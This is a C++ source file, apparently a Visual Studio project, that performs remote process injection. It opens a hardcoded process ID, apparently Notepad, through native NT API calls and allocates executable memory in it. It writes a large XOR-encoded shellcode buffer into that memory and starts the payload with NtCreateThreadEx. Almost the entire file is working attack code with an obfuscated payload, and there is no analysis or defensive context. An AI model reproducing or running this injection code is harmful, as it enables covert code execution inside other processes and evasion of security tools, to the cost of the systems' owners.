// NtProcessInjection.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Windows.h>
#include "calls.h"
int main()
{
    unsigned char buf[] =
        "\xeb\x27\x5b\x53\x5f\xb0\x3b\xfc\xae\x75\xfd\x57\x59\x53"
        "\x5e\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6\x66\x81\x3f"
        "\x78\xd0\x74\x07\x80\x3e\x3b\x75\xea\xeb\xe6\xff\xe1\xe8"
        "\xd4\xff\xff\xff\x13\x3b\xef\x5b\x90\xf7\xe3\xfb\xdf\x13"
        "\x13\x13\x52\x42\x52\x43\x41\x5b\x22\xc1\x42\x76\x5b\x98"
        "\x41\x73\x5b\x98\x41\x0b\x45\x5b\x98\x41\x33\x5b\x98\x61"
        "\x43\x5e\x22\xda\x5b\x1c\xa4\x59\x59\x5b\x22\xd3\xbf\x2f"
        "\x72\x6f\x11\x3f\x33\x52\xd2\xda\x1e\x52\x12\xd2\xf1\xfe"
        "\x41\x5b\x98\x41\x33\x52\x42\x98\x51\x2f\x5b\x12\xc3\x75"
        "\x92\x6b\x0b\x18\x11\x1c\x96\x61\x13\x13\x13\x98\x93\x9b"
        "\x13\x13\x13\x5b\x96\xd3\x67\x74\x5b\x12\xc3\x43\x98\x5b"
        "\x0b\x57\x98\x53\x33\x5a\x12\xc3\xf0\x45\x5b\xec\xda\x5e"
        "\x22\xda\x52\x98\x27\x9b\x5b\x12\xc5\x5b\x22\xd3\x52\xd2"
        "\xda\x1e\xbf\x52\x12\xd2\x2b\xf3\x66\xe2\x5f\x10\x5f\x37"
        "\x1b\x56\x2a\xc2\x66\xcb\x4b\x57\x98\x53\x37\x5a\x12\xc3"
        "\x75\x52\x98\x1f\x5b\x57\x98\x53\x0f\x5a\x12\xc3\x52\x98"
        "\x17\x9b\x5b\x12\xc3\x52\x4b\x52\x4b\x4d\x4a\x49\x52\x4b"
        "\x52\x4a\x52\x49\x5b\x90\xff\x33\x52\x41\xec\xf3\x4b\x52"
        "\x4a\x49\x5b\x98\x01\xfa\x58\xec\xec\xec\x4e\x5a\xad\x64"
        "\x60\x21\x4c\x20\x21\x13\x13\x52\x45\x5a\x9a\xf5\x5b\x92"
        "\xff\xb3\x12\x13\x13\x5a\x9a\xf6\x5a\xaf\x11\x13\x02\x4f"
        "\xd3\xbb\x81\x93\x52\x47\x5a\x9a\xf7\x5f\x9a\xe2\x52\xa9"
        "\x5f\x64\x35\x14\xec\xc6\x5f\x9a\xf9\x7b\x12\x12\x13\x13"
        "\x4a\x52\xa9\x3a\x93\x78\x13\xec\xc6\x79\x19\x52\x4d\x43"
        "\x43\x5e\x22\xda\x5e\x22\xd3\x5b\xec\xd3\x5b\x9a\xd1\x5b"
        "\xec\xd3\x5b\x9a\xd2\x52\xa9\xf9\x1c\xcc\xf3\xec\xc6\x5b"
        "\x9a\xd4\x79\x03\x52\x4b\x5f\x9a\xf1\x5b\x9a\xea\x52\xa9"
        "\x8a\xb6\x67\x72\xec\xc6\x96\xd3\x67\x19\x5a\xec\xdd\x66"
        "\xf6\xfb\x80\x13\x13\x13\x5b\x90\xff\x03\x5b\x9a\xf1\x5e"
        "\x22\xda\x79\x17\x52\x4b\x5b\x9a\xea\x52\xa9\x11\xca\xdb"
        "\x4c\xec\xc6\x90\xeb\x13\x6d\x46\x5b\x90\xd7\x33\x4d\x9a"
        "\xe5\x79\x53\x52\x4a\x7b\x13\x03\x13\x13\x52\x4b\x5b\x9a"
        "\xe1\x5b\x22\xda\x52\xa9\x4b\xb7\x40\xf6\xec\xc6\x5b\x9a"
        "\xd0\x5a\x9a\xd4\x5e\x22\xda\x5a\x9a\xe3\x5b\x9a\xc9\x5b"
        "\x9a\xea\x52\xa9\x11\xca\xdb\x4c\xec\xc6\x90\xeb\x13\x6e"
        "\x3b\x4b\x52\x44\x4a\x7b\x13\x53\x13\x13\x52\x4b\x79\x13"
        "\x49\x52\xa9\x18\x3c\x1c\x23\xec\xc6\x44\x4a\x52\xa9\x66"
        "\x7d\x5e\x72\xec\xc6\x5a\xec\xdd\xfa\x2f\xec\xec\xec\x5b"
        "\x12\xd0\x5b\x3a\xd5\x5b\x96\xe5\x66\xa7\x52\xec\xf4\x4b"
        "\x79\x13\x4a\x5a\xd4\xd1\xe3\xa6\xb1\x45\xec\xc6\x78\xd0";



    HANDLE notepad;
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    CLIENT_ID clid;
    DWORD pid = 9368;
    clid.UniqueProcess = (void*)pid;
    clid.UniqueThread = 0;

    if (NtOpenProcess(&notepad, PROCESS_ALL_ACCESS, &objAttr, &clid))
    {
        std::cout << "Error Opening Notepad handle." << std::endl;

        std::cout << GetLastError() << std::endl;
    }

    
    PVOID remoteAddr = 0;
    SIZE_T sz = 510;
    if (NtAllocateVirtualMemory(notepad, &remoteAddr, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))
    {
        std::cout << "Error allocating a region in the remote process" << std::endl;
        std::cout << GetLastError() << std::endl;
    }


    if (NtWriteVirtualMemory(notepad, remoteAddr, buf, sizeof(buf), NULL))
    {
        std::cout << "Error writing to the region in the remote process" << std::endl;
        std::cout << GetLastError() << std::endl;
    }
    

    HANDLE hThread;

    if (NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, notepad, remoteAddr, NULL, NULL, 0, 0, 0, NULL))
    {
        std::cout << "Error creating a thread in the remote process" << std::endl;
        std::cout << GetLastError() << std::endl;
    }
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
